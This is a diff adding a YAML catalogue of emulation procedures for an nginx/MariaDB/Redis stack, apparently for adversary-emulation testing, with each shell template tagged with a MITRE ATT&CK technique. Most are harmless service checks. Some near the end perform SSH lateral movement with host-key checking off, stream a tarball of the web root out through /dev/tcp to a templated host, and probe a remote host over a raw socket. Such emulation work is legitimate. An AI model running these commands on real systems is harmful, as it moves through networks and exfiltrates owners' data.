@@ -1,0 +1,111 @@
+# Depth procedures for the stack family.
+attack_version: "20.1"
+procedures:
+  - id: d-ss-ssh
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: ss -tln 2>/dev/null | grep -q ":22 " && echo ok$?
+  - id: d-ss-http
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: ss -tln 2>/dev/null | grep -q ":80 " && echo ok$?
+  - id: d-ss-db
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: ss -tln 2>/dev/null | grep -qE ":(3306|6379) " && echo ok$?
+  - id: d-nginx-t
+    technique: T1007
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: nginx -t 2>&1 | grep -q "test is successful" && echo ok$?
+  - id: d-nginx-docroot
+    technique: T1083
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: test -f /var/www/html/index.nginx-debian.html && echo ok$?
+  - id: d-nginx-site-on
+    technique: T1007
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: readlink /etc/nginx/sites-enabled/default 2>/dev/null | grep -q sites-available && echo ok$?
+  - id: d-index-mentions
+    technique: T1083
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: grep -qi "nginx" /var/www/html/index.nginx-debian.html && echo ok$?
+  - id: d-redis-ping
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: redis-cli ping 2>/dev/null | grep -q PONG && echo ok$?
+  - id: d-mysql-ping
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: mysqladmin ping 2>/dev/null | grep -q alive && echo ok$?
+  - id: d-mysql-select
+    technique: T1078.001
+    tactic: TA0001
+    source: own
+    protocol: ssh
+    template: mysql -N -e "SELECT 1" 2>/dev/null | grep -q 1 && echo ok$?
+  - id: d-mysql-version
+    technique: T1518
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: mysql -N -e "SELECT VERSION()" 2>/dev/null | grep -q MariaDB && echo ok$?
+  - id: d-redis-set-get
+    technique: T1078
+    tactic: TA0001
+    source: own
+    protocol: ssh
+    template: redis-cli set dkey-{{hex}} v >/dev/null 2>&1 && redis-cli get dkey-{{hex}} 2>/dev/null | grep -q "^v" && echo ok$?
+  - id: d-stack-pipe
+    technique: T1059.004
+    tactic: TA0002
+    source: own
+    protocol: ssh
+    template: nginx -v 2>&1 | grep -oE "nginx/[0-9.]+" | grep -q nginx && echo ok$?
+  - id: d-wwwuser
+    technique: T1087.001
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: id www-data && echo ok$?
+  - id: d-ssh-lateral-cred
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh -oBatchMode=yes -oStrictHostKeyChecking=no {{user}}@{{ip}} uname 2>/dev/null || echo no$?
+  - id: d-exfil-devtcp
+    technique: T1048.002
+    tactic: TA0010
+    source: own
+    protocol: ssh
+    template: tar cz /var/www/html 2>/dev/null | timeout 2 bash -c "cat > /dev/tcp/{{ip}}/{{port}}" 2>/dev/null || echo no$?
+  - id: d-http-probe-remote
+    technique: T1105
+    tactic: TA0011
+    source: own
+    protocol: ssh
+    template: timeout 3 bash -c "exec 3<>/dev/tcp/{{ip}}/80 && printf "HEAD / HTTP/1.0\r\n\r\n" >&3" 2>/dev/null || echo no$?
+  - id: d-tar-www
+    technique: T1560.001
+    tactic: TA0009
+    source: own
+    protocol: ssh
+    template: tar czf /tmp/{{word}}-s/www.tgz /var/www/html 2>/dev/null && tar tzf /tmp/{{word}}-s/www.tgz | grep -q . && echo ok$?
